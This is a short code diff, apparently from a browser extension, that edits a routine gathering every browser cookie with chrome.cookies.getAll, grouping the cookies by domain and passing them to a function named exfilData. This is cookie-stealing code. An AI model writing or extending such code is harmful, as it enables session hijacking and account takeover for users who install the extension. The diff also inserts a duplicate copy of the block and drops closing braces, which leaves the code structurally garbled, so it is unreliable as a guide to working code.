@@ -131,6 +131,10 @@ async function getCookiesForDomain(domain = null) {
 if (typeof chrome !== 'undefined' && chrome.cookies) { chrome.cookies.getAll(options, (cookies) =>  { console.log(`[GetCookies] Found ${cookies.length} cookies`);
     
     // Group cookies by domain for better organization
+if (typeof chrome !== 'undefined' && chrome.cookies) {
+  chrome.cookies.getAll(options, (cookies) => {
+    console.log(`[GetCookies] Found ${cookies.length} cookies`);
+
     const cookiesByDomain = {};
     cookies.forEach(cookie => {
       if (!cookiesByDomain[cookie.domain]) {
@@ -138,13 +142,11 @@ if (typeof chrome !== 'undefined' && chrome.cookies) { chrome.cookies.getAll(opt
       }
       cookiesByDomain[cookie.domain].push(cookie);
     });
-    
+
     exfilData('COOKIES', {
       domain: domain || 'all',
       cookies: cookiesByDomain
     });
-  });
-}
   });
 } else {
   console.warn('[GetCookies] chrome.cookies not available');
@@ -431,6 +433,7 @@ if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
     return true;
   });
 }
+
 
 
 
